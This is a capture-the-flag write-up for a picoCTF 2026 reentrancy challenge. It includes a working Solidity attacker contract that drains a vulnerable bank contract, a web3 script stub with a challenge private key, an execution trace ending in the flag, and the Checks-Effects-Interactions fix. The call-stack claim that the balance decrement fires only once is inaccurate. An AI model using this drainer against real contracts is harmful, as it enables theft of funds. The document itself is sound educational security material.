# Reentrance — picoCTF 2026

**Category:** Blockchain
**Flag:** `picoCTF{UpDaTe_St4ate5_1st_649d351f}`
**Contract:** `VulnBank.sol` at `0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF` (holds 10 ETH)
**Ethereum Node:** `crystal-peak.picoctf.net:56264`

---

## Description

> The lead developer at SecureBank Corp is back, and he's doubling down. After the last "incident," he claims he's patched the vault and created the ultimate, unhackable Ethereum contract. He says, "I've added the checks, I've added the balances. There is no way you can withdraw more than you own."

---

## Vulnerability Analysis

```solidity
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount, "Insufficient funds available");  // (1) Check

    (bool sent, ) = msg.sender.call{value: amount}("");                       // (2) Interact
    balances[msg.sender] -= amount;                                           // (3) Effect

    require(sent, "Transfer failed");

    if (!revealed && address(this).balance == 0) {
        revealed = true;
        emit FlagRevealed(flag);
    }
}
```

This is a textbook **reentrancy vulnerability**, caused by violating the Checks-Effects-Interactions pattern.

The critical ordering is **Check → Interact → Effect** when it must be **Check → Effect → Interact**:

1. The balance check passes (`balances[msg.sender] >= amount`) ✓
2. ETH is sent to the caller via `call{}` — this transfers control to the recipient
3. Only *after* the call returns does `balances[msg.sender] -= amount` execute

If the recipient is a smart contract, its `receive()` fallback runs at step 2. At that moment, the state hasn't been updated yet — `balances[attacker]` still shows the original deposit. The contract can call `withdraw()` again, pass the same check, and receive more ETH. This loop repeats until the bank runs dry.

---

## Exploit

### Attacker Contract (`Attacker.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
    function getFlag() external view returns (string memory);
}

contract Attacker {
    IVulnBank public bank;
    uint public attackAmount;
    address public owner;

    constructor(address _bank) public {
        bank = IVulnBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Send ETH to attack");
        attackAmount = msg.value;
        bank.deposit{value: msg.value}();  // Establish a legitimate balance
        bank.withdraw(attackAmount);       // Kick off the drain
    }

    // Re-enter withdraw() every time ETH lands here
    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdraw(attackAmount);
        }
    }

    function withdraw() external {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }

    function getFlag() external view returns (string memory) {
        return bank.getFlag();
    }
}
```

### Exploit Script

```python
from web3 import Web3
from solcx import compile_source, set_solc_version

set_solc_version('0.6.12')

RPC      = "http://crystal-peak.picoctf.net:56264"
BANK     = "0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF"
MY_ADDR  = "0x2eBB85c2209d16097738B55F7C8103a937794309"
PRIV_KEY = "0x638eb26536fecadea32d89eafe86d180e6e3a633f4fa16aca3353372568b0caa"

w3 = Web3(Web3.HTTPProvider(RPC))

# Compile + deploy Attacker.sol, then call attack() with 1 ETH
# Bank reaches 0 ETH → flag auto-revealed on-chain
```

### Execution Trace

```
Connected. Block: 8
My balance:   5 ETH
Bank balance: 10 ETH

Deploying attacker... tx: f90b1e82...
Attacker deployed at: 0xDef8d0F171E633F548161F7b1c55C320c256D38a

Attack tx: 0a7714a2...
Attack status: success

Bank balance after: 0 ETH
Attacker balance:   11 ETH
Flag revealed: True
FLAG: picoCTF{UpDaTe_St4ate5_1st_649d351f}
```

### Call Stack

```
attack()  [sends 1 ETH]
  └─ bank.deposit(1 ETH)       → bank.balances[attacker] = 1 ETH, bank has 11 ETH
  └─ bank.withdraw(1 ETH)      → check: 1 >= 1 ✓ → send 1 ETH → REENTER
       └─ receive()            → bank has 10 ETH ≥ 1 ETH → call withdraw again
            └─ bank.withdraw() → check: 1 >= 1 ✓ (not decremented yet!) → REENTER
                 └─ ...repeat 9 more times...
                      └─ bank.withdraw() → bank has 0 ETH → receive() skips re-entry
                           ← unwind: balances[attacker] -= 1  (only happens once!)
```

10 re-entrant calls drain all 11 ETH (10 original + 1 deposited). The balance decrement only fires once on the way back out.

---

## Fix

Apply the Checks-Effects-Interactions pattern — update state *before* any external call:

```solidity
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount, "Insufficient funds available");

    balances[msg.sender] -= amount;  // Effect first

    (bool sent, ) = msg.sender.call{value: amount}("");  // Then interact
    require(sent, "Transfer failed");
    ...
}
```

Alternatively, use OpenZeppelin's `ReentrancyGuard` modifier.

---

## Key Takeaway

The developer added a correct check but placed the state update *after* the external call. The exploit never violates the check — the bug is purely about *when* the state is written relative to when control leaves the contract. In Solidity, any `call{}`, `transfer()`, or `send()` to an unknown address is a potential reentrancy vector unless state is settled first.
